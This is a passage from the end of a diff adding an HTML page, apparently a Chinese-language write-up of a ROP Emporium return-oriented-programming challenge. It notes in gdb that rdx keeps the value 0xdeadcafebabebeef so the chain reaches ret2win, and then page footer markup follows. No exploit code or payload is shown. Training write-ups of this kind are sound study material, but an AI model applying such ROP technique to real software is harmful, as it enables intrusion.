+<p><img alt="image-20200504144118966" src="../_images/image-20200504144118966.png" /></p>
+<p>gdb 调试：</p>
+<p><img alt="image-20200504144304433" src="../_images/image-20200504144304433.png" /></p>
+<p><img alt="image-20200504144443107" src="../_images/image-20200504144443107.png" /></p>
+<p>看，<code class="docutils literal notranslate"><span class="pre">frame_dummy</span></code> 调用过程中没有改变过 <code class="docutils literal notranslate"><span class="pre">rdx</span></code> 的值</p>
+<p>call 完后，rdx 还是 0xdeadcafebabebeef</p>
+<p><img alt="image-20200504144613542" src="../_images/image-20200504144613542.png" /></p>
+<p>走完就能调用 <code class="docutils literal notranslate"><span class="pre">ret2win</span></code> 了</p>
+<p>ropemporium pwned!</p>
+<p>that’s over!</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; 版权所有 2021, scriptk1d.</p>
+  </div>
+
+  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用了 
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
+    由 <a href="https://readthedocs.org">Read the Docs</a>开发.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
